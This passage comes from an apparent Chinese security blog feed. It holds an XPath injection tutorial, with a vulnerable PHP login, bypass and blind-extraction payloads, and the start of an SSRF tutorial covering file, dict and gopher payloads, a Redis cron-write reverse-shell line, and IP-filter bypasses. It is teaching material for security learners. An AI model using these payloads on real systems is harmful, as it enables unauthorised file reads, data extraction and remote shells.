class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">root</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">users</span>&gt;</span> <br>        <span class="hljs-tag">&lt;<span class="hljs-name">user</span>&gt;</span> <br>            <span class="hljs-tag">&lt;<span class="hljs-name">id</span>&gt;</span>1<span class="hljs-tag">&lt;/<span class="hljs-name">id</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">username</span>&gt;</span>test1<span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span>test1<span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">user</span>&gt;</span> <br>        <span class="hljs-tag">&lt;<span class="hljs-name">user</span>&gt;</span> <br>            <span class="hljs-tag">&lt;<span class="hljs-name">id</span>&gt;</span>2<span class="hljs-tag">&lt;/<span class="hljs-name">id</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">username</span>&gt;</span>test2<span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span>test2<span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">user</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">users</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">root</span>&gt;</span><br></code></pre></td></tr></table></figure><p>test.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs PHP"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$xml</span>=<span class="hljs-title function_ invoke__">simplexml_load_file</span>(<span class="hljs-string">&#x27;test.xml&#x27;</span>);<br><span class="hljs-variable">$name</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;name&#x27;</span>];<br><span class="hljs-variable">$pwd</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;pwd&#x27;</span>];<br><span class="hljs-variable">$query</span>=<span class="hljs-string">&quot;/root/users/user[username/text()=&#x27;&quot;</span>.<span class="hljs-variable">$name</span>.<span class="hljs-string">&quot;&#x27; and password/text()=&#x27;&quot;</span>.<span class="hljs-variable">$pwd</span>.<span class="hljs-string">&quot;&#x27;]&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$query</span>;<br><span class="hljs-variable">$result</span>=<span class="hljs-variable">$xml</span>-&gt;<span class="hljs-title function_ invoke__">xpath</span>(<span class="hljs-variable">$query</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$result</span>)&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;h2&gt;Welcome&lt;/h2&gt;&#x27;</span>;<br>    <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$result</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span>=&gt;<span class="hljs-variable">$value</span>)&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;br /&gt;ID:&#x27;</span>.<span class="hljs-variable">$value</span>-&gt;id;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;br /&gt;Username:&#x27;</span>.<span class="hljs-variable">$value</span>-&gt;username;<br>    &#125;<br>&#125;<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><code>simplexml_load_file</code>，加载xml文件</p><p>正常查询：<code>?name=test1&amp;pwd=test1</code></p><p>server端语句：<code>/root/users/user[username/text()=&#39;test1&#39;and password/text()=&#39;test1&#39;]</code></p><p>注入语句：<code>?name=&#39; or 1=1 or &#39;&#39;=&#39;&amp;pwd=1</code></p><p>server语句：<code>/root/users/user[username/text()=&#39;&#39; or 1=1 or &#39;&#39;=&#39;&#39; and password/text()=&#39;1&#39;]</code></p><h3 id="注入payload"><a href="#注入payload" class="headerlink" title="注入payload"></a>注入payload</h3><h4 id="一般注入形式"><a href="#一般注入形式" class="headerlink" title="一般注入形式"></a>一般注入形式</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs PHP"><span class="hljs-comment">//原php代码中的查询语句</span><br><span class="hljs-variable">$query</span>=<span class="hljs-string">&quot;user/username[@name=&#x27;&quot;</span>.<span class="hljs-variable">$user</span>.<span class="hljs-string">&quot;&#x27;]&quot;</span>;<br><span class="hljs-comment">//构造payload1：user1&#x27; or 1=1 or &#x27;&#x27;=&#x27;</span><br><span class="hljs-variable">$query</span>=<span class="hljs-string">&quot;user/username[@name=&#x27;user1&#x27; or 1=1 or &#x27;&#x27;=&#x27;&#x27;]&quot;</span>;<br><span class="hljs-comment">//构造payload2：&#x27;]|//*|//*[&#x27;</span><br><span class="hljs-variable">$query</span>=<span class="hljs-string">&quot;user/username[@name=&#x27;user1&#x27;]|//*|//*[&#x27;&#x27;]&quot;</span>;<br></code></pre></td></tr></table></figure><h4 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs PHP">链：/ -&gt; root -&gt; user/user -&gt; username/email/password<br>判断根节点下的节点数<br><span class="hljs-string">&#x27;or count(/)=1  or &#x27;</span><span class="hljs-string">&#x27;=&#x27;</span>     <span class="hljs-comment">//根节点数量为1</span><br><span class="hljs-string">&#x27;or count(/*)=1 or &#x27;</span><span class="hljs-string">&#x27;=&#x27;</span>     <span class="hljs-comment">//根节点下只有一个子节点</span><br>判断根节点下节点长度<br><span class="hljs-string">&#x27;or string-length(name(/*[1]))=1 or &#x27;</span><span class="hljs-string">&#x27;=&#x27;</span>      <span class="hljs-comment">//判断根节点下的节点长度为1</span><br>判断根节点下节点名称<br><span class="hljs-string">&#x27;or substring(name(/*[1]), 1, 1)=&#x27;</span>r<span class="hljs-string">&#x27;  or &#x27;</span><span class="hljs-string">&#x27;=&#x27;</span>  <span class="hljs-comment">//猜根节点下的节点名称</span><br><span class="hljs-string">&#x27;or substring(name(/*[1]), 2, 1)=&#x27;</span>o<span class="hljs-string">&#x27;  or &#x27;</span><span class="hljs-string">&#x27;=&#x27;</span><br>...<br>假设根节点下子节点名称为root，判断子节点下的的节点<br><span class="hljs-string">&#x27;or count(/root)=1  or &#x27;</span><span class="hljs-string">&#x27;=&#x27;</span>                  <span class="hljs-comment">//root节点数量为1</span><br><span class="hljs-string">&#x27;or count(/root/user/*)&gt;1 or &#x27;</span><span class="hljs-string">&#x27;=&#x27;</span>            <span class="hljs-comment">//root下有两个或以上节点</span><br><span class="hljs-string">&#x27;or string-length(name(/root/*[1]))=4  or &#x27;</span><span class="hljs-string">&#x27;=&#x27;</span>    <span class="hljs-comment">//判断第一个子节点长度为4</span><br>猜解root下的节点名称：<br><span class="hljs-string">&#x27;or substring(name(/root/*[1]), 1, 1)=&#x27;</span>u<span class="hljs-string">&#x27;  or &#x27;</span><span class="hljs-string">&#x27;=&#x27;</span>    <span class="hljs-comment">//猜root节点下的第一个节点名称</span><br><span class="hljs-string">&#x27;or substring(name(/root/*[1]), 2, 1)=&#x27;</span>s<span class="hljs-string">&#x27;  or &#x27;</span><span class="hljs-string">&#x27;=&#x27;</span><br>...<br>假设root下节点名称为user<br><span class="hljs-string">&#x27;or count(/root/user)=2  or &#x27;</span><span class="hljs-string">&#x27;=&#x27;</span>   <span class="hljs-comment">//user节点有两个，则可以猜测出root节点结构，root下两个节点，均为user节点</span><br><span class="hljs-string">&#x27;or substring(name(/root/user[position()=1]/*[1]), 1, 1)=&#x27;</span>u<span class="hljs-string">&#x27;  or &#x27;</span><span class="hljs-string">&#x27;=&#x27;</span><br><span class="hljs-string">&#x27;or substring(name(/root/user[position()=1]/*[1]), 2, 1)=&#x27;</span>s<span class="hljs-string">&#x27;  or &#x27;</span><span class="hljs-string">&#x27;=&#x27;</span><br>...<br>判断user节点的子节点长度<br><span class="hljs-string">&#x27;or string-length(name(/root/user[position()=1]/*[1]))=8 or &#x27;</span><span class="hljs-string">&#x27;=&#x27;</span>  <span class="hljs-comment">//user下第一个子节点长名称度为8</span><br>判断user节点的下子节点名称<br><span class="hljs-string">&#x27;or substring(name(/root/user[position()=1]/*[1]), 1, 1)=&#x27;</span>u<span class="hljs-string">&#x27;  or &#x27;</span><span class="hljs-string">&#x27;=&#x27;</span>  <span class="hljs-comment">//猜user节点下的第一个节点名称</span><br>...<br>最终所有子节点值验证如下：<br><span class="hljs-string">&#x27;or substring(name(/root/user[position()=1]/*[1]), 1)=&#x27;</span>username<span class="hljs-string">&#x27;  or &#x27;</span><span class="hljs-string">&#x27;=&#x27;</span><br><span class="hljs-string">&#x27;or substring(name(/root/user[position()=1]/*[2]), 1)=&#x27;</span>email<span class="hljs-string">&#x27;  or &#x27;</span><span class="hljs-string">&#x27;=&#x27;</span><br><span class="hljs-string">&#x27;or substring(name(/root/user[position()=1]/*[3]), 1)=&#x27;</span>password<span class="hljs-string">&#x27;  or &#x27;</span><span class="hljs-string">&#x27;=&#x27;</span><br>猜有无子节点<br><span class="hljs-string">&#x27;or count(/root/user[position()=1]/username/*)&gt;0 or &#x27;</span><span class="hljs-string">&#x27;=&#x27;</span>   <br><span class="hljs-string">&#x27;or count(/root/user[position()=1]/email/*)&gt;0 or &#x27;</span><span class="hljs-string">&#x27;=&#x27;</span> <br><span class="hljs-string">&#x27;or count(/root/user[position()=1]/accounttype/*)&gt;0 or &#x27;</span><span class="hljs-string">&#x27;=&#x27;</span><br><span class="hljs-string">&#x27;or count(/root/user[position()=1]/username/password/*)&gt;0 or &#x27;</span><span class="hljs-string">&#x27;=&#x27;</span><br><span class="hljs-literal">false</span>则没有节点<br>读最后节点长度<br><span class="hljs-string">&#x27;or string-length((//user[position()=1]/username[position()=1]))=6 or &#x27;</span><span class="hljs-string">&#x27;=&#x27;</span> <span class="hljs-comment">//第一个user下username长度</span><br>读值<br><span class="hljs-string">&#x27;or substring((//user[position()=1]/username[position()=1]),1,1)=&#x27;</span>f<span class="hljs-string">&#x27;  or &#x27;</span><span class="hljs-string">&#x27;=&#x27;</span><br><span class="hljs-string">&#x27;or substring((//user[position()=1]/username[position()=1]),2,1)=&#x27;</span>l<span class="hljs-string">&#x27;  or &#x27;</span><span class="hljs-string">&#x27;=&#x27;</span><br><span class="hljs-string">&#x27;or substring((//user[position()=1]/username[position()=1]),3,1)=&#x27;</span>a<span class="hljs-string">&#x27;  or &#x27;</span><span class="hljs-string">&#x27;=&#x27;</span><br><span class="hljs-string">&#x27;or substring((//user[position()=1]/username[position()=1]),4,1)=&#x27;</span>g<span class="hljs-string">&#x27;  or &#x27;</span><span class="hljs-string">&#x27;=&#x27;</span><br>...<br></code></pre></td></tr></table></figure><p>更多参考</p><p><a href="https://jiang-niao.github.io/2020/04/24/%E4%BB%8Ectf%E9%A2%98%E7%9B%AE%E4%B8%AD%E5%AD%A6%E4%B9%A0xpath%E6%B3%A8%E5%85%A5/#CTF%E9%A2%98%E7%9B%AE">xpath盲注脚本</a></p>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
      <tag>xml</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SSRF</title>
    <link href="/2023/10/10/SSRF/"/>
    <url>/2023/10/10/SSRF/</url>
    
    <content type="html"><![CDATA[<h1 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h1><h2 id="一、概念"><a href="#一、概念" class="headerlink" title="一、概念"></a>一、概念</h2><p>SSRF (Server-Side Request Forgery,服务器端请求伪造)是一种由攻击者构造请求，由服务端发起请求的安全漏洞。一般情况下，SSRF攻击的目标是外网无法访问的内部系统(正因为请求是由服务端发起的，所以服务端能请求到与自身相连而与外网隔离的内部系统)。</p><h2 id="二、SSRF漏洞原理"><a href="#二、SSRF漏洞原理" class="headerlink" title="二、SSRF漏洞原理"></a>二、SSRF漏洞原理</h2><p>SSRF的形成大多是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。例如，黑客操作服务端从指定URL地址获取网页文本内容，加载指定地址的图片等，利用的是服务端的请求伪造。SSRF利用存在缺陷的Web应用作为代理攻击远程和本地的服务器。</p><p>主要攻击方式如下所示。</p><ul><li>对外网、服务器所在内网、本地进行端口扫描，获取一些服务的banner信息。</li><li>攻击运行在内网或本地的应用程序。</li><li>对内网Web应用进行指纹识别，识别企业内部的资产信息。</li><li>攻击内外网的Web应用，主要是使用HTTP GET请求就可以实现的攻击(比如struts2、SQli等)。</li><li>利用file协议读取本地文件等。</li></ul><h2 id="三、漏洞函数"><a href="#三、漏洞函数" class="headerlink" title="三、漏洞函数"></a>三、漏洞函数</h2><p><code>file_get_contents()</code>、<code>fsockopen()</code>、<code>curl_exec()</code>、<code>fopen()</code>、<code>readfile()</code></p><p>举例：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$url</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;url&#x27;</span>];;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$url</span>);<br><span class="hljs-meta">?&gt;</span><br><br><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">GetFile</span>(<span class="hljs-params"><span class="hljs-variable">$host</span>,<span class="hljs-variable">$port</span>,<span class="hljs-variable">$link</span></span>) </span>&#123; <br>    <span class="hljs-variable">$fp</span> = <span class="hljs-title function_ invoke__">fsockopen</span>(<span class="hljs-variable">$host</span>, <span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$port</span>), <span class="hljs-variable">$errno</span>, <span class="hljs-variable">$errstr</span>, <span class="hljs-number">30</span>);   <br>    <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$fp</span>) &#123; <br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;<span class="hljs-subst">$errstr</span> (error number <span class="hljs-subst">$errno</span>) \n&quot;</span>; <br>    &#125; <span class="hljs-keyword">else</span> &#123; <br>        <span class="hljs-variable">$out</span> = <span class="hljs-string">&quot;GET <span class="hljs-subst">$link</span> HTTP/1.1\r\n&quot;</span>; <br>        <span class="hljs-variable">$out</span> .= <span class="hljs-string">&quot;Host: <span class="hljs-subst">$host</span>\r\n&quot;</span>; <br>        <span class="hljs-variable">$out</span> .= <span class="hljs-string">&quot;Connection: Close\r\n\r\n&quot;</span>; <br>        <span class="hljs-variable">$out</span> .= <span class="hljs-string">&quot;\r\n&quot;</span>; <br>        <span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$fp</span>, <span class="hljs-variable">$out</span>); <br>        <span class="hljs-variable">$contents</span>=<span class="hljs-string">&#x27;&#x27;</span>; <br>        <span class="hljs-keyword">while</span> (!<span class="hljs-title function_ invoke__">feof</span>(<span class="hljs-variable">$fp</span>)) &#123; <br>            <span class="hljs-variable">$contents</span>.= <span class="hljs-title function_ invoke__">fgets</span>(<span class="hljs-variable">$fp</span>, <span class="hljs-number">1024</span>); <br>        &#125; <br>        <span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$fp</span>); <br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$contents</span>; <br>    &#125; <br>&#125;<br><span class="hljs-meta">?&gt;</span><br><br>payload:<br>http:<span class="hljs-comment">//127.0.0.1/ssrf.php?url=192.168.1.10:3306</span><br>http:<span class="hljs-comment">//127.0.0.1/ssrf.php?url=file:///c:/windows/win.ini</span><br></code></pre></td></tr></table></figure><h2 id="四、协议"><a href="#四、协议" class="headerlink" title="四、协议"></a>四、协议</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;test ssrf&lt;br&gt;input param \&quot;url\&quot;&quot;</span>;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">curl</span>(<span class="hljs-params"><span class="hljs-variable">$url</span></span>)</span>&#123;  <br>    <span class="hljs-variable">$ch</span> = <span class="hljs-title function_ invoke__">curl_init</span>(); <span class="hljs-comment">// 创建新的curl资源</span><br>    <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_URL, <span class="hljs-variable">$url</span>);  <span class="hljs-comment">//设置url和相应的选项</span><br>    <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_HEADER, <span class="hljs-number">0</span>);<br>    <span class="hljs-title function_ invoke__">curl_exec</span>(<span class="hljs-variable">$ch</span>);   <span class="hljs-comment">//抓取url并把它传递给浏览器</span><br>    <span class="hljs-title function_ invoke__">curl_close</span>(<span class="hljs-variable">$ch</span>);  <span class="hljs-comment">//关闭curl资源，并且释放系统资源</span><br>&#125;<br><br><span class="hljs-variable">$url</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;url&#x27;</span>];<br><span class="hljs-title function_ invoke__">curl</span>(<span class="hljs-variable">$url</span>);  <br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h3 id="file"><a href="#file" class="headerlink" title="file:&#x2F;&#x2F;"></a>file:&#x2F;&#x2F;</h3><p>在有回显的情况下，利用 file 协议可以读取任意内容</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-symbol">http:</span>/<span class="hljs-regexp">/127.0.0.1/ssrf</span>.php?url=<span class="hljs-symbol">file:</span>/<span class="hljs-regexp">//c</span><span class="hljs-symbol">:/windows/win</span>.ini<br></code></pre></td></tr></table></figure><h3 id="dict"><a href="#dict" class="headerlink" title="dict:&#x2F;&#x2F;"></a>dict:&#x2F;&#x2F;</h3><p>泄露安装软件版本信息，查看端口，操作内网redis服务等</p><p>一般配合<code>/etc/hosts</code>、<code>proc/net/arp</code>来发现内网网段</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">ttp:<span class="hljs-regexp">//</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span><span class="hljs-regexp">/ssrf.php?url=dict:/</span>/<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">80</span><br>http:<span class="hljs-regexp">//</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span><span class="hljs-regexp">/ssrf.php?url=dict:/</span><span class="hljs-regexp">/127.0.0.1:6379/i</span>nfo  <br></code></pre></td></tr></table></figure><h3 id="gopher"><a href="#gopher" class="headerlink" title="gopher:&#x2F;&#x2F;"></a>gopher:&#x2F;&#x2F;</h3><p>gopher支持发出GET、POST请求：可以先截获get请求包和post请求包，再构造成符合gopher协议的请求。gopher协议是ssrf利用中一个最强大的协议(俗称万能协议)。可用于反弹shell</p><p>gopher协议格式：</p><p><code>URL:gopher://&lt;host&gt;:&lt;port&gt;/&lt;gopher-path&gt;_后接TCP数据流</code> ，可以用来发起GET、POST的http请求。</p><p>特点：</p><ol><li>gopher的默认端口是70</li><li>如果发起post请求，回车换行需要使用%0d%0a，如果多个参数，参数之间的&amp;也需要进行URL编码</li><li>Gopher 的以下几点局限性：<ul><li>大部分 PHP 并不会开启 fopen 的 gopher wrapper</li><li>file_get_contents 的 gopher 协议不能 URLencode</li><li>file_get_contents 关于 Gopher 的 302 跳转有 bug，导致利用失败</li><li>PHP 的 curl 默认不 follow 302 跳转</li><li>curl&#x2F;libcurl 7.43 上 gopher 协议存在 bug（%00 截断），经测试 7.49 可用</li></ul></li></ol><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://<span class="hljs-number">127.0.0.1</span>/ssrf.php?url=gopher%<span class="hljs-number">3</span>A//<span class="hljs-number">127.0.0.1</span>%<span class="hljs-number">3</span>A80/_GET%<span class="hljs-number">2520</span>/flag%<span class="hljs-number">2520</span>HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span>%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>AHost%<span class="hljs-number">253</span>A%<span class="hljs-number">2520127</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">1</span>%<span class="hljs-number">253</span>A80%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>A%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>A<br><span class="hljs-comment">#redis写shell</span><br><span class="hljs-attribute">gopher</span>://<span class="hljs-number">127.0.0.1:6379</span>/_*<span class="hljs-number">1</span> %<span class="hljs-number">0</span>d %<span class="hljs-number">0</span>a $<span class="hljs-number">8</span>%<span class="hljs-number">0</span>d %<span class="hljs-number">0</span>aflushall %<span class="hljs-number">0</span>d %<span class="hljs-number">0</span>a*<span class="hljs-number">3</span> %<span class="hljs-number">0</span>d %<span class="hljs-number">0</span>a $<span class="hljs-number">3</span>%<span class="hljs-number">0</span>d  %<span class="hljs-number">0</span>aset %<span class="hljs-number">0</span>d %<span class="hljs-number">0</span>a $<span class="hljs-number">1</span>%<span class="hljs-number">0</span>d %<span class="hljs-number">0</span>a1 %<span class="hljs-number">0</span>d %<span class="hljs-number">0</span>a $<span class="hljs-number">64</span>%<span class="hljs-number">0</span>d %<span class="hljs-number">0</span>a %<span class="hljs-number">0</span>d %<span class="hljs-number">0</span>a %<span class="hljs-number">0</span>a %<span class="hljs-number">0</span>a*/<span class="hljs-number">1</span> * * * * bash  -i &gt;&amp; /dev/tcp/<span class="hljs-number">127.0.0.1</span>/<span class="hljs-number">4444</span> <span class="hljs-number">0</span>&gt;&amp;<span class="hljs-number">1</span> %<span class="hljs-number">0</span>a %<span class="hljs-number">0</span>a %<span class="hljs-number">0</span>a %<span class="hljs-number">0</span>a %<span class="hljs-number">0</span>a %<span class="hljs-number">0</span>d %<span class="hljs-number">0</span>a  %<span class="hljs-number">0</span>d %<span class="hljs-number">0</span>a %<span class="hljs-number">0</span>d %<span class="hljs-number">0</span>a*<span class="hljs-number">4</span> %<span class="hljs-number">0</span>d %<span class="hljs-number">0</span>a $<span class="hljs-number">6</span>%<span class="hljs-number">0</span>d %<span class="hljs-number">0</span>aconfig %<span class="hljs-number">0</span>d %<span class="hljs-number">0</span>a $<span class="hljs-number">3</span>%<span class="hljs-number">0</span>d %<span class="hljs-number">0</span>aset %<span class="hljs-number">0</span>d %<span class="hljs-number">0</span>a $<span class="hljs-number">3</span>%<span class="hljs-number">0</span>d  %<span class="hljs-number">0</span>adir %<span class="hljs-number">0</span>d %<span class="hljs-number">0</span>a $<span class="hljs-number">16</span>%<span class="hljs-number">0</span>d %<span class="hljs-number">0</span>a/var/spool/cron/ %<span class="hljs-number">0</span>d %<span class="hljs-number">0</span>a*<span class="hljs-number">4</span> %<span class="hljs-number">0</span>d %<span class="hljs-number">0</span>a $<span class="hljs-number">6</span>%<span class="hljs-number">0</span>d %<span class="hljs-number">0</span>aconfig  %<span class="hljs-number">0</span>d %<span class="hljs-number">0</span>a $<span class="hljs-number">3</span>%<span class="hljs-number">0</span>d %<span class="hljs-number">0</span>aset %<span class="hljs-number">0</span>d %<span class="hljs-number">0</span>a $<span class="hljs-number">10</span>%<span class="hljs-number">0</span>d %<span class="hljs-number">0</span>adbfilename %<span class="hljs-number">0</span>d %<span class="hljs-number">0</span>a $<span class="hljs-number">4</span>%<span class="hljs-number">0</span>d %<span class="hljs-number">0</span>aroot %<span class="hljs-number">0</span>d  %<span class="hljs-number">0</span>a*<span class="hljs-number">1</span> %<span class="hljs-number">0</span>d %<span class="hljs-number">0</span>a $<span class="hljs-number">4</span>%<span class="hljs-number">0</span>d %<span class="hljs-number">0</span>asave %<span class="hljs-number">0</span>d %<span class="hljs-number">0</span>aquit %<span class="hljs-number">0</span>d %<span class="hljs-number">0</span>a<span class="hljs-string">&quot;  </span><br></code></pre></td></tr></table></figure><h3 id="http-和https"><a href="#http-和https" class="headerlink" title="http:&#x2F;&#x2F;和https:&#x2F;&#x2F;"></a>http:&#x2F;&#x2F;和https:&#x2F;&#x2F;</h3><p>探测内网主机存活</p><h2 id="五、绕过方式"><a href="#五、绕过方式" class="headerlink" title="五、绕过方式"></a>五、绕过方式</h2><h3 id="绕过"><a href="#绕过" class="headerlink" title="@绕过"></a>@绕过</h3><p><code>http://www.baidu.com@10.10.10.10</code>与<code>http://10.10.10.10</code>请求是相同的。</p><h3 id="点分割符号替换"><a href="#点分割符号替换" class="headerlink" title="点分割符号替换"></a>点分割符号替换</h3><p>在浏览器中可以使用不同的分割符号来代替域名中的.分割，可以使用<code>。</code>、<code>｡</code>、<code>．</code>来代替：</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">http:</span>//www。target。<span class="hljs-keyword">com</span><br><span class="hljs-symbol">http:</span>//www｡target｡<span class="hljs-keyword">com</span><br><span class="hljs-symbol">http:</span>//www．target．<span class="hljs-keyword">com</span>  <br></code></pre></td></tr></table></figure><h3 id="绕过127-0-0-1等本地ip"><a href="#绕过127-0-0-1等本地ip" class="headerlink" title="绕过127.0.0.1等本地ip"></a>绕过127.0.0.1等本地ip</h3><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">http://127.0.0.1<br>http://localhost<br>http://127.255.255.254<br>127.0.0.1 - 127.255.255.254<br><span class="hljs-link">http://</span>[<span class="hljs-string">::1</span>]<br><span class="hljs-link">http://</span>[<span class="hljs-string">::ffff:7f00:1</span>]<br><span class="hljs-link">http://</span>[<span class="hljs-string">::ffff:127.0.0.1</span>]<br>http://127.1<br>http://127.0.1<br>http://0:80  <br></code></pre></td></tr></table></figure><h3 id="ip的进制转换"><a href="#ip的进制转换" class="headerlink" title="ip的进制转换"></a>ip的进制转换</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">8</span>进制格式：<span class="hljs-number">0300</span>.<span class="hljs-number">0250</span>.<span class="hljs-number">0</span>.<span class="hljs-number">1</span><br><span 